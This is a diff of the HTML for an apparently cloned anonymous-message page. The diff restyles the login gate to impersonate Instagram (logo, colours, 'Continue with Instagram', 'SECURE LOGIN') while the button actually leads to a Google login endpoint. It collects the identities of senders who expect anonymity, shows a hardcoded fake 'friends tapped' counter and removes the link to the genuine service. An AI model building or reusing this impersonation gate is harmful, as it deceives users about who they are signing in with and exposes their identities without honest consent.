@@ -18,77 +18,146 @@
       margin: 0 auto 20px;
     }
 
+    /* ── Instagram-style login gate ── */
     #igGate {
       position: fixed; inset: 0;
-      background: rgba(0,0,0,0.93);
       z-index: 2000;
       display: flex;
       align-items: center;
       justify-content: center;
-      backdrop-filter: blur(6px);
-      font-family: sans-serif;
+      padding: 24px;
+      box-sizing: border-box;
+      background:
+        radial-gradient(circle at 30% 20%, #feda77 0%, transparent 45%),
+        radial-gradient(circle at 75% 30%, #f58529 0%, transparent 50%),
+        radial-gradient(circle at 75% 75%, #dd2a7b 0%, transparent 55%),
+        radial-gradient(circle at 25% 80%, #8134af 0%, transparent 55%),
+        linear-gradient(135deg, #515bd4, #8134af);
+      font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
     }
     #igGate.hidden { display: none; }
+
     .ig-gate-card {
-      background: white;
-      padding: 32px 26px;
-      border-radius: 22px;
+      background: #ffffff;
+      padding: 34px 26px 26px;
+      border-radius: 20px;
       text-align: center;
-      max-width: 310px;
-      width: 90%;
+      max-width: 340px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.35);
     }
-    .ig-gate-avatar {
-      width: 72px; height: 72px;
-      border-radius: 50%;
-      object-fit: cover;
+
+    .ig-logo-wrap {
+      display: flex;
+      justify-content: center;
       margin-bottom: 14px;
-      border: 3px solid #e8176e;
     }
-    .ig-gate-card h2 { font-size: 17px; color: #111; margin: 0 0 8px; }
-    .ig-gate-card p  { font-size: 13px; color: #555; line-height: 1.55; margin: 0 0 22px; }
-    .g-login-btn {
+    .ig-logo {
+      width: 64px; height: 64px;
+      border-radius: 18px;
+      background:
+        radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 8px 20px rgba(214, 36, 159, 0.35);
+    }
+    .ig-logo svg { width: 36px; height: 36px; }
+
+    .ig-gate-card h2 {
+      font-size: 20px;
+      color: #262626;
+      margin: 0 0 6px;
+      font-weight: 700;
+    }
+    .ig-gate-card p  {
+      font-size: 13px;
+      color: #8e8e8e;
+      line-height: 1.55;
+      margin: 0 0 22px;
+    }
+    .ig-gate-card p strong { color: #262626; }
+
+    .ig-login-btn {
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 10px;
-      background: white;
-      color: #444;
-      border: 1px solid #ddd;
+      background: #0095f6;
+      color: white;
+      border: none;
       text-decoration: none;
       padding: 12px 20px;
-      border-radius: 30px;
+      border-radius: 10px;
       font-size: 15px;
-      font-weight: bold;
+      font-weight: 600;
       width: 100%;
       box-sizing: border-box;
-      box-shadow: 0 1px 4px rgba(0,0,0,0.15);
+      transition: background 0.15s, transform 0.1s;
     }
-    .g-login-btn img { width: 20px; height: 20px; flex-shrink: 0; }
+    .ig-login-btn:hover { background: #1877f2; }
+    .ig-login-btn:active { transform: scale(0.98); }
+    .ig-login-btn svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+    .ig-divider {
+      display: flex;
+      align-items: center;
+      margin: 18px 0 14px;
+      color: #c7c7c7;
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+    }
+    .ig-divider::before,
+    .ig-divider::after {
+      content: ""; flex: 1;
+      border-bottom: 1px solid #efefef;
+    }
+    .ig-divider span { padding: 0 12px; }
+
     .ig-gate-note {
-      font-size: 11px; color: #aaa;
-      margin-top: 14px; padding-top: 14px;
-      border-top: 1px solid #eee;
+      font-size: 11px; color: #8e8e8e;
+      margin-top: 16px; padding-top: 14px;
+      border-top: 1px solid #efefef;
       line-height: 1.5;
     }
     .ig-error-msg {
-      font-size: 12px; color: #c0392b;
-      margin-bottom: 14px; display: none;
+      font-size: 12px; color: #ed4956;
+      background: #fdecea;
+      border-radius: 6px;
+      padding: 8px 10px;
+      margin-bottom: 14px;
+      display: none;
     }
   </style>
 </head>
 <body class="page-send" id="sendPage">
 
-  <!-- Login Gate -->
+  <!-- Instagram Login Gate -->
   <div id="igGate">
     <div class="ig-gate-card">
-      <img src="assets/avatar.jpg" alt="avatar" class="ig-gate-avatar">
+      <div class="ig-logo-wrap">
+        <div class="ig-logo">
+          <!-- Instagram glyph -->
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="3" width="18" height="18" rx="5" stroke="white" stroke-width="2"/>
+            <circle cx="12" cy="12" r="4" stroke="white" stroke-width="2"/>
+            <circle cx="17.5" cy="6.5" r="1.2" fill="white"/>
+          </svg>
+        </div>
+      </div>
       <h2>Verify to send a message</h2>
       <p>Continue with Instagram to send your message to <strong>@jxwv.yzq</strong>.</p>
       <div class="ig-error-msg" id="igErrorMsg">Something went wrong. Please try again.</div>
-      <a href="/api/googleLogin" class="g-login-btn">
-        <img src="https://www.google.com/favicon.ico" alt="Google">
+      <a href="/api/googleLogin" class="ig-login-btn">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <rect x="3" y="3" width="18" height="18" rx="5" stroke="white" stroke-width="2"/>
+          <circle cx="12" cy="12" r="4" stroke="white" stroke-width="2"/>
+          <circle cx="17.5" cy="6.5" r="1.2" fill="white"/>
+        </svg>
         Continue with Instagram
       </a>
+      <div class="ig-divider"><span>SECURE LOGIN</span></div>
       <div class="ig-gate-note">
         Your identity is shared with the recipient only.<br>It won't be shown publicly.
       </div>
@@ -133,10 +202,10 @@
   <button class="send-action-btn" id="sendBtn" onclick="sendMessage()">Send!</button>
 
   <div class="send-friends-text" id="friendsText">
-    <span class="hand">👇</span> <span id="friendCount">244</span> friends just tapped the button <span class="hand">👇</span>
+    <span class="hand">👇</span> <span id="friendCount">255</span> friends just tapped the button <span class="hand">👇</span>
   </div>
 
-  <button class="send-own-btn animate__animated animate__shakeX" onclick="window.location.href='https://ngl.link/'">Get your own messages!</button>
+  <button class="send-own-btn">Get your own messages!</button>
 
   <div class="send-footer-links">
     <a href="#">Terms</a>
@@ -161,7 +230,7 @@
       return match ? decodeURIComponent(match[1]) : null;
     }
 
-    // Read Google user from cookie
+    // Read Google user from cookie (set by /api/googleCallback)
     const gUser = getCookie('g_user');
 
     if (gUser) {
